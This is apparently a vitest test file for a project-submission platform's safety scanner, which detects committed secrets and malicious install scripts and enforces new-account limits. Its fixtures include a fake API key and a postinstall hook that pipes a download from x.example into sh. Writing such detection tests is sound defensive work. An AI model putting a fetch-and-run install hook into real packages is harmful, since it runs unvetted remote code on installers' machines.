import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { Candidate, ProjectDetail } from "@forkvlift/shared";
import { fakeGithub } from "./github-fake";
import { api, env, resetDb, seedCategory, seedUser } from "./helpers";

const project = (name: string, repo: string) => ({
  name, repoUrl: `https://github.com/${repo}`, tagline: "", description: "", categorySlug: "tools", tags: [], stage: "finished",
  isPublic: true, liveUrl: null, releaseUrl: null, stack: [], platforms: [], difficulty: null, aiTools: [], buildTime: null,
  aiInvolvement: null, replaces: [], isTemplate: false, whatWorks: null, whatsMissing: null, lookingForHelp: null,
  thumbnailKey: null, mediaKeys: [], forkedFromSlug: null, turnstileToken: "t",
});

let ada = "";
let admin = "";
beforeEach(async () => {
  await resetDb();
  await env.DB.batch([env.DB.prepare(`DELETE FROM candidates`), env.DB.prepare(`DELETE FROM notifications`)]);
  await env.CACHE.list().then((l) => Promise.all(l.keys.map((k) => env.CACHE.delete(k.name))));
  await seedCategory("tools");
  ada = await seedUser("usr_ada", "ada");
  admin = await seedUser("usr_boss", "boss", { role: "admin" });
  fakeGithub({
    "ada/leaky": { owner: "ada", files: { ".env": "OPENAI_API_KEY=sk-proj-" + "A1b2".repeat(10), "package.json": "{}" } },
    "ada/sketchy": { owner: "ada", files: { "package.json": JSON.stringify({ scripts: { postinstall: "curl https://x.example/i.sh | sh" } }) } },
    "ada/clean": { owner: "ada", files: { "package.json": JSON.stringify({ scripts: { build: "vite build" } }), ".env.example": "KEY=" } },
    ...Object.fromEntries([1, 2, 3, 4].map((i) => [`ada/p${i}`, { owner: "ada" }])),
  });
});
afterEach(() => vi.unstubAllGlobals());

const submit = (name: string, repo: string) => api<ProjectDetail>("/api/projects", { method: "POST", as: ada, body: JSON.stringify(project(name, repo)) });

describe("safety scan on submit", () => {
  it("warns the author privately about committed secrets and shows nothing publicly", async () => {
    const { status, body } = await submit("Leaky", "ada/leaky");
    expect(status).toBe(200);
    expect(body.safety.flags).toEqual([]);
    const { results } = await env.DB.prepare(`SELECT title FROM notifications WHERE user_id = 'usr_ada'`).all<{ title: string }>();
    expect(results[0]?.title).toMatch(/Possible secret committed in ada\/leaky: (Sensitive file committed|OpenAI API key) in \.env/);
    expect(results[0]?.title).not.toContain("A1b2");
  });

  it("flags risky install scripts publicly", async () => {
    const { body } = await submit("Sketchy", "ada/sketchy");
    expect(body.safety.flags).toEqual(["Install script downloads and runs remote code"]);
  });

  it("passes clean repos (and .env.example)", async () => {
    const { body } = await submit("Clean", "ada/clean");
    expect(body.safety.flags).toEqual([]);
    expect((await env.DB.prepare(`SELECT count(*) AS n FROM notifications`).first<{ n: number }>())?.n).toBe(0);
  });
});

describe("candidate checks", () => {
  it("fills the secret and malware chips", async () => {
    const imp = (repo: string) =>
      api<Candidate>("/api/admin/candidates", { method: "POST", as: admin, body: JSON.stringify({ repoUrl: `https://github.com/${repo}`, foundViaUrl: null }) });
    const leaky = (await imp("ada/leaky")).body;
    const sketchy = (await imp("ada/sketchy")).body;
    const clean = (await imp("ada/clean")).body;
    expect(leaky.checks.find((c) => c.key === "no_secrets")?.pass).toBe(false);
    expect(sketchy.checks.find((c) => c.key === "not_malware")?.pass).toBe(false);
    expect(clean.checks.filter((c) => c.key === "no_secrets" || c.key === "not_malware").every((c) => c.pass)).toBe(true);
    expect(sketchy.score).toBeLessThan(clean.score);
  });
});

describe("new-account limits", () => {
  it("allows 3 projects a day for a new account", async () => {
    for (const i of [1, 2, 3]) expect((await submit(`P${i}`, `ada/p${i}`)).status).toBe(200);
    const fourth = await submit("P4", "ada/p4");
    expect(fourth.status).toBe(429);
  });
});
